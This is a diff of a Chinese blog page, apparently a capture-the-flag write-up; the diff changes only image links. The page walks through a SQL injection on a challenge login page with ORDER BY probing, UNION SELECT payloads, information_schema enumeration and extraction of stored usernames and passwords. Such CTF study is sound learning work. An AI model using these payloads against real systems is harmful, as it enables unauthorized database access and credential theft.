@@ -189,25 +189,31 @@
 
 <p>接下来老老实实order by 猜字段数</p>
 <p><code>/check.php?username=admin&#39; order by 3%23&amp;password=1</code>    </p>
-<p>![image-20210110215248928](D:\Program Files\github配置\hoexblog\source\imags\image-20210110215248928.png)</p>
+<img src="img/image-20210110215248928.png">
+
 <p><code>/check.php?username=admin&#39; order by 4%23&amp;password=1</code>     </p>
-<p>![image-20210110214956242](D:\Program Files\github配置\hoexblog\source\imags\image-20210110214956242.png)</p>
+<img src="img/image-20210110214956242.png">
+
 <p>说明有三个字段，接下来用<code>union</code>查询测试注入点。</p>
 <p><code>/check.php?username=1&#39; union select 1,2,3%23&amp;password=1</code></p>
-<p>![image-20210110211630597](D:\Program Files\github配置\hoexblog\source\imags\image-20210110211630597.png)</p>
+<img src="img/image-20210110211630597.png">
+
 <p>测试出回显位置，在 2 和 3 字段回显数据，查询一下当前数据库名及版本</p>
 <p><code>/check.php?username=1&#39; union select 1,database(),version()%23&amp;password=1</code>             </p>
-<p>![image-20210110212442995](D:\Program Files\github配置\hoexblog\source\imags\image-20210110212442995.png)</p>
+<img src="img/image-20210110212442995.png">
+
 <p>接下来开始我们的爆表、爆字段之旅</p>
 <p>/check.php?username=1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=1</p>
-<p>![image-20210110213102725](D:\Program Files\github配置\hoexblog\source\imags\image-20210110213102725.png)</p>
+<img src="img/image-20210110213102725.png">
+
 <p>的得到了上面两个表，接着查询</p>
 <p>/check.php?username=1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’l0ve1ysq1’%23&amp;password=1</p>
 <img src="img/image-20210110213331724.png">
 
 <p>接着对这三个字段查询</p>
 <p>/check.php?username=1’ union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password=1</p>
-<p>![image-20210110213753657](D:\Program Files\github配置\hoexblog\source\imags\image-20210110213753657.png)</p>
+<img src="img/image-20210110213753657.png">
+
 <p>得到flag。</p>
 
       
